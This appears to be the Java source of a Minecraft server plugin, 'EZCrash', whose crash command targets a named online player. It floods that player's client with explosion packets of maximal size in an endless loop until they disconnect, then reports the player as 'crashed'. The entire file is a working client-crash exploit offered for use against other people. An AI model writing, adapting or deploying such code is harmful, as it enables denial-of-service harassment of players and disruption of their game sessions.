package me.notom3ga.ezcrash;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class CrashCommand implements TabExecutor {
    private final EZCrash plugin;
    private final ProtocolManager protocol = ProtocolLibrary.getProtocolManager();

    public CrashCommand(EZCrash plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (args.length != 1) {
            return false;
        }

        Player player = Bukkit.getPlayer(args[0]);
        if (player == null || !player.isOnline()) {
            sender.sendMessage(Component.text(args[0] + " is not online!", NamedTextColor.RED));
            return true;
        }

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            while (player.isOnline()) {
                PacketContainer packet = new PacketContainer(PacketType.Play.Server.EXPLOSION);

                Location location = player.getLocation();
                packet.getModifier().writeDefaults();
                packet.getDoubles().write(0, player.getLocation().getX());
                packet.getDoubles().write(1, player.getLocation().getY());
                packet.getDoubles().write(2, player.getLocation().getZ());
                packet.getFloat().write(0, Float.MAX_VALUE);

                try {
                    protocol.sendServerPacket(player, packet);
                } catch (Exception ignore) {
                }
            }
            sender.sendMessage(Component.text(args[0] + " has been crashed!", NamedTextColor.GREEN));
        });
        return true;
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
        List<String> completions = null;
        if (args.length == 0) {
            completions = new ArrayList<>();
            for (Player player : Bukkit.getOnlinePlayers()) {
                completions.add(player.getName());
            }
        }
        return completions;
    }
}
